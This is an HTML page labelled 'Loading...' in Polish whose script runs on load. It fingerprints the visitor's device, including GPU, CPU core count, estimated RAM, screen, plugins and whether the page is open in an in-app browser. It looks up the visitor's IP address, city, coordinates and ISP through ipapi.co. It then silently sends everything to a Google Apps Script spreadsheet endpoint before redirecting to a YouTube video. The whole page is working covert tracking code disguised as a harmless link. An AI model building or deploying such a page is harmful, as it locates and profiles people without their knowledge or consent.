<!DOCTYPE html>
<html>
<head>
    <title>Ładowanie...</title>
    <meta charset="UTF-8">
</head>
<body>
    <script>
        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzRc0TLSz2PxBlJqCRV1x2Jt-tc0X23g28h5SCKWrOCCl-34peXrF7fzpyyytABzHwvoQ/exec";
        const VIDEO_ID = "dQw4w9WgXcQ";
        
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'WebGL not supported';
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown';
                }
                return gl.getParameter(gl.RENDERER) || 'unknown';
            } catch(e) {
                return 'error';
            }
        }
        
        function getRealRAM() {
            const deviceRAM = navigator.deviceMemory;
            if (deviceRAM && deviceRAM !== 8) {
                return deviceRAM + ' GB';
            }
            const ua = navigator.userAgent;
            const cores = navigator.hardwareConcurrency;
            
            if (ua.includes('Windows')) {
                if (cores >= 12) return '32 GB (estimated)';
                if (cores >= 8) return '16 GB (estimated)';
                if (cores >= 4) return '8 GB (estimated)';
                return '4 GB (estimated)';
            }
            if (ua.includes('Mac')) {
                if (cores >= 10) return '16 GB (estimated)';
                if (cores >= 8) return '16 GB (estimated)';
                if (cores >= 4) return '8 GB (estimated)';
                return '4 GB (estimated)';
            }
            if (ua.includes('Android') || ua.includes('iPhone')) {
                if (cores >= 8) return '8 GB (estimated)';
                if (cores >= 6) return '6 GB (estimated)';
                if (cores >= 4) return '4 GB (estimated)';
                return '3 GB (estimated)';
            }
            return deviceRAM ? deviceRAM + ' GB' : 'unknown';
        }
        
        function getCPUDetails() {
            try {
                const cores = navigator.hardwareConcurrency || 'unknown';
                let vendor = 'unknown';
                let model = 'unknown';
                const ua = navigator.userAgent;
                const platform = navigator.platform || '';
                
                if (platform.includes('Win') || ua.includes('Windows')) {
                    vendor = 'Windows PC';
                    if (cores >= 8) model = 'High-end (8+ cores)';
                    else if (cores >= 4) model = 'Mid-range (4-6 cores)';
                    else model = 'Entry-level (2-3 cores)';
                }
                else if (platform.includes('Mac') || ua.includes('Mac OS')) {
                    vendor = 'Apple';
                    model = ua.includes('Apple') ? 'Apple Silicon' : 'Intel Mac';
                }
                else if (ua.includes('Android')) {
                    const match = ua.match(/\(([^)]+)\)/);
                    if (match && match[1].includes('SM-')) vendor = 'Samsung';
                    else vendor = 'Android';
                    if (ua.includes('Exynos')) model = 'Exynos';
                    else if (ua.includes('Snapdragon')) model = 'Snapdragon';
                    else if (ua.includes('MediaTek')) model = 'MediaTek';
                    else model = 'ARM processor';
                }
                else if (ua.includes('iPhone') || ua.includes('iPad')) {
                    vendor = 'Apple';
                    model = 'A-series (iPhone/iPad)';
                }
                else if (ua.includes('Linux')) {
                    vendor = 'Linux';
                    model = 'Linux machine';
                }
                
                return {
                    cores: cores,
                    vendor: vendor,
                    model: model,
                    ram: getRealRAM()
                };
            } catch(e) {
                return { cores: 'unknown', vendor: 'error', model: 'error', ram: 'unknown' };
            }
        }
        
        async function getLocation() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 2500);
                const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                clearTimeout(timeoutId);
                if (!response.ok) throw new Error();
                const data = await response.json();
                return {
                    ip: data.ip || 'unknown',
                    city: data.city || 'unknown',
                    region: data.region || 'unknown',
                    country: data.country_name || 'unknown',
                    latitude: data.latitude || 'unknown',
                    longitude: data.longitude || 'unknown',
                    isp: data.org || 'unknown',
                    timezone: data.timezone || 'unknown'
                };
            } catch(e) {
                try {
                    const fallback = await fetch('https://api.ipify.org?format=json');
                    const ipData = await fallback.json();
                    return {
                        ip: ipData.ip,
                        city: 'unknown',
                        region: 'unknown',
                        country: 'unknown',
                        latitude: 'unknown',
                        longitude: 'unknown',
                        isp: 'unknown',
                        timezone: 'unknown'
                    };
                } catch(e2) {
                    return {
                        ip: 'unknown',
                        city: 'unknown',
                        region: 'unknown',
                        country: 'unknown',
                        latitude: 'unknown',
                        longitude: 'unknown',
                        isp: 'unknown',
                        timezone: 'unknown'
                    };
                }
            }
        }
        
        function getOtherData() {
            return {
                platform: navigator.platform || 'unknown',
                language: navigator.language || 'unknown',
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth || 'unknown',
                plugins: navigator.plugins ? navigator.plugins.length : 0,
                connection: (() => {
                    try {
                        const conn = navigator.connection || navigator.mozConnection;
                        return conn ? conn.effectiveType || conn.type : 'unknown';
                    } catch(e) { return 'unknown'; }
                })(),
                inApp: (() => {
                    const ua = navigator.userAgent.toLowerCase();
                    return (ua.includes('instagram') || ua.includes('fb') || ua.includes('fban') || ua.includes('messenger')) ? 1 : 0;
                })()
            };
        }
        
        async function getAllData() {
            const [gpu, cpu, location, other] = await Promise.all([
                Promise.resolve(getGPU()),
                Promise.resolve(getCPUDetails()),
                getLocation(),
                Promise.resolve(getOtherData())
            ]);
            
            return {
                timestamp: new Date().toISOString(),
                ip: location.ip,
                city: location.city,
                region: location.region,
                country: location.country,
                latitude: location.latitude,
                longitude: location.longitude,
                isp: location.isp,
                timezone: location.timezone,
                userAgent: navigator.userAgent,
                platform: other.platform,
                language: other.language,
                screen: other.screen,
                colorDepth: other.colorDepth,
                plugins: other.plugins,
                connection: other.connection,
                inApp: other.inApp,
                cpu_cores: cpu.cores,
                cpu_vendor: cpu.vendor,
                cpu_model: cpu.model,
                cpu_ram: cpu.ram,
                gpu: gpu,
                video_id: VIDEO_ID
            };
        }
        
        function saveToGoogleSheets(data) {
            fetch(GOOGLE_SHEETS_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(e => console.log('Send error:', e));
        }
        
        async function main() {
            const data = await getAllData();
            saveToGoogleSheets(data);
            window.location.href = 'https://www.youtube.com/watch?v=' + VIDEO_ID;
        }
        
        main();
    </script>
</body>
</html>
